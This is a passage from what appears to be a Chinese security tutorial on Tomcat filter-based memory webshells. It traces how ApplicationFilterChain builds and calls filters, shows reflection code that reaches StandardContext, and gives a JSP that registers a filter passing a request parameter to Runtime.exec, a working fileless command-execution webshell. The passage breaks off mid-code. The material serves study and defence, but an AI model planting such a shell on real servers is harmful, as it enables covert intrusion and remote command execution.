punctuation\">{</span>\n             <span class=\"token keyword\">throw</span> var15<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> var16<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token class-name\">Throwable</span> e <span class=\"token operator\">=</span> <span class=\"token class-name\">ExceptionUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">unwrapInvocationTargetException</span><span class=\"token punctuation\">(</span>var16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token class-name\">ExceptionUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">handleThrowable</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">(</span>sm<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filterChain.filter\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n     <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationDispatcher</span><span class=\"token punctuation\">.</span>WRAP_SAME_OBJECT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                 lastServicedRequest<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 lastServicedResponse<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span>\n\n             <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">isAsyncSupported</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>servletSupportsAsync<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                 request<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.apache.catalina.ASYNC_SUPPORTED\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">.</span>FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span>\n\n             <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>request <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">HttpServletRequest</span> <span class=\"token operator\">&amp;&amp;</span> response <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">HttpServletResponse</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name\">Globals</span><span class=\"token punctuation\">.</span>IS_SECURITY_ENABLED<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                 <span class=\"token class-name\">Principal</span> principal <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">)</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getUserPrincipal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token class-name\">SecurityUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">doAsPrivilege</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"service\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">,</span> classTypeUsedInService<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">,</span> principal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                 <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span><span class=\"token function\">service</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span>\n         <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletException</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">RuntimeException</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">IOException</span> var17<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token keyword\">throw</span> var17<span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Throwable</span> var18<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token class-name\">Throwable</span> e <span class=\"token operator\">=</span> <span class=\"token class-name\">ExceptionUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">unwrapInvocationTargetException</span><span class=\"token punctuation\">(</span>var18<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token class-name\">ExceptionUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">handleThrowable</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">(</span>sm<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filterChain.servlet\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationDispatcher</span><span class=\"token punctuation\">.</span>WRAP_SAME_OBJECT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                 lastServicedRequest<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 lastServicedResponse<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span>\n\n         <span class=\"token punctuation\">}</span>\n\n     <span class=\"token punctuation\">}</span>\n <span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们可以看到通过filter.doFilter(request, response, this);来调用了doFilter，然后再向前看如何获得fiter：Filter filter = filterConfig.getFilter(); 前面已经简单说过了filterConfigs是什么了，一个filterConfig是一个ApplicationFilterConfig的实现类，在ApplicationFilterChain中：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token class-name\">ApplicationFilterConfig</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> filters <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ApplicationFilterConfig</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>是将值传入，那么需要知道在哪初始化ApplicationFilterChain；在StandardWrapperValve#invoke中：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">ApplicationFilterChain</span> filterChain <span class=\"token operator\">=</span> <span class=\"token class-name\">ApplicationFilterFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">createFilterChain</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> wrapper<span class=\"token punctuation\">,</span> servlet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>跟进createFilterChain，需要关注StandardContext、filterChain、FilterMaps、FilterConfig这些的操作。<br>代码通过</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">StandardContext</span> context <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardContext</span><span class=\"token punctuation\">)</span>wrapper<span class=\"token punctuation\">.</span><span class=\"token function\">getParent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>来获取当前的StandardContext，并通过</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">FilterMap</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> filterMaps <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">findFilterMaps</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>来获得filterMap，通过filter名字得到对应的filterConfig：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">filterConfig <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationFilterConfig</span><span class=\"token punctuation\">)</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">findFilterConfig</span><span class=\"token punctuation\">(</span>filterMap<span class=\"token punctuation\">.</span><span class=\"token function\">getFilterName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>最后通过</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">filterChain<span class=\"token punctuation\">.</span><span class=\"token function\">addFilter</span><span class=\"token punctuation\">(</span>filterConfig<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>加入到filterChain中，，思路比较清晰，只要知道如何将我们想要的Filter信息添加到filterConfigs中，就可以添加到filterChain，从而触发。<br>直接看debug信息可能直观一点：<br><img src=\"https://cdn.nlark.com/yuque/0/2022/png/21933819/1666088263913-e3e631ca-fd82-4d50-9eca-5a879ca93aab.png#clientId=ucf2cda4e-14de-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=450&amp;id=u03ac92a2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=450&amp;originWidth=1113&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=67359&amp;status=done&amp;style=none&amp;taskId=u5d62e3e7-3a58-426b-9bbd-451b22978ce&amp;title=&amp;width=1113\" alt=\"image.png\"><br>跟刚开始介绍的一样，filterDef需要对应的filter、filterName、FilterClass；filterMaps则需要filterName、urlPattern、dispatcherMapping。<br>还有一点是获得StandardContext，有许多资源可以加以利用，方法很多，简单写两种大佬的demo：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//获取ApplicationContextFacade类</span>\n<span class=\"token class-name\">ServletContext</span> servletContext <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getServletContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n<span class=\"token comment\">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span>\n<span class=\"token class-name\">Field</span> appContextField <span class=\"token operator\">=</span> servletContext<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nappContextField<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">ApplicationContext</span> applicationContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationContext</span><span class=\"token punctuation\">)</span> appContextField<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>servletContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n<span class=\"token comment\">//反射获取ApplicationContext类属性context为StandardContext类</span>\n<span class=\"token class-name\">Field</span> standardContextField <span class=\"token operator\">=</span> applicationContext<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nstandardContextField<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">StandardContext</span> standardContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardContext</span><span class=\"token punctuation\">)</span> standardContextField<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>applicationContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>或者</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//获取servletContext</span>\n<span class=\"token class-name\">ServletContext</span> servletContext <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getServletContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">ApplicationContextFacade</span> applicationContextFacade <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationContextFacade</span><span class=\"token punctuation\">)</span> servletContext<span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Field</span> applicationContextFacadeContext <span class=\"token operator\">=</span> applicationContextFacade<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\napplicationContextFacadeContext<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//获取applicationContext</span>\n<span class=\"token class-name\">ApplicationContext</span> applicationContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationContext</span><span class=\"token punctuation\">)</span> applicationContextFacadeContext<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>applicationContextFacade<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Field</span> applicationContextContext <span class=\"token operator\">=</span> applicationContext<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\napplicationContextContext<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//获取standardContext</span>\n<span class=\"token class-name\">StandardContext</span> standardContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardContext</span><span class=\"token punctuation\">)</span> applicationContextContext<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>applicationContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后就是注入jsp的代码了：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.io.IOException\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.lang.reflect.Field\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.core.ApplicationContext\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.core.StandardContext\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.tomcat.util.descriptor.web.FilterDef\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.tomcat.util.descriptor.web.FilterMap\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.lang.reflect.Constructor\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.core.ApplicationFilterConfig\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.Context\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page contentType<span class=\"token operator\">=</span><span class=\"token string\">\"text/html;charset=UTF-8\"</span> language<span class=\"token operator\">=</span><span class=\"token string\">\"java\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.connector.Request\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.core.ApplicationContextFacade\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.util.HashMap\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">FIlterShell</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Filter</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FilterConfig</span> filterConfig<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filter初始化\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">FilterChain</span> chain<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> <span class=\"token class-name\">FilterShell</span> <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"FilterShell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">FilterShell</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FilterShell</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                n<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        chain<span class=\"token punctuation\">.</span><span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token punctuation\">}</span>\n\n\n\n<span class=\"token punctuation\">}</span>\n    <span class=\"token class-name\">ServletContext</span> servletContext <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getServletContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">ApplicationContextFacade</span> applicationContextFacade <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationContextFacade</span><span class=\"token punctuation\">)</span> servletContext<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Field</span> applicationContextFacadeContext <span class=\"token operator\">=</span> applicationContextFacade<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    applicationContextFacadeContext<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">ApplicationContext</span> applicationContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationContext</span><span class=\"token punctuation\">)</span> applicationContextFacadeContext<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>applicationContextFacade<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Field</span> applicationContextContext <span class=\"token operator\">=</span> applicationContext<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    applicationContextContext<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">StandardContext</span> standardContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardContext</span><span class=\"token punctuation\">)</span> applicationContextContext<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>applicationContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">FIlterShell</span> filter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FIlterShell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token class-name\">FiterName</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"FilterMemShell\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">FilterDef</span> filterDef <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FilterDef</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    filterDef<span class=\"token punctuation\">.</span><span class=\"token function\">setFilter</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    filterDef<span class=\"token punctuation\">.</span><span class=\"token function\">setFilterName</span><span class=\"token 